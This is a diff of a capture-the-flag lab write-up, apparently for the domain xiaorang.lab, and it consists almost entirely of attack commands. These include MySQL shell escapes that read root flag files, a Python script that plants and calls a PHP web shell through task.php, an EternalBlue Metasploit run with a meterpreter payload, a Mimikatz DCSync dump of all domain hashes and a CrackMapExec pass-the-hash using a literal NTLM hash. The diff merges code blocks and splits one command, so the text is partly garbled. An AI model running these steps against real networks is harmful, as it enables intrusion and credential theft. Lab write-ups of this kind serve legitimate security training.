@@ -44,17 +44,7 @@
 
 ```
 sudo mysql -e '! find / -name flag*'
-```
-
-
-
-```
 sudo mysql -e '! cat /root/flag/flag01.txt'
-```
-
-
-
-```
 import requests
 
 session = requests.session()
@@ -86,41 +76,18 @@ url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
 r = session.get(url3)
 r = session.get(url_pre + filepath + "?1=system('dir');")
 print(r.text)
-```
-
-
-
-```
 vim/etc/proxychains4.conf
-```
-
-
-
-```
 proxychains msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/bind_tcp_uuid
 set RHOSTS 172.22.1.21
 exploit
-```
-
-
-
-```
 load kiwi
 
-kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit # 导出域内所有用户的信息(包括哈希值)
-```
-
-
-
-```
+kiwi_cmd "lsadump::
+dcsync /domain:
+xiaorang.lab /all /csv" exit # 导出域内所有用户的信息(包括哈希值)
 proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type UsersAdministratorflagflag03.txt"
-```
-
-
-
-```
 flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
 ```
 
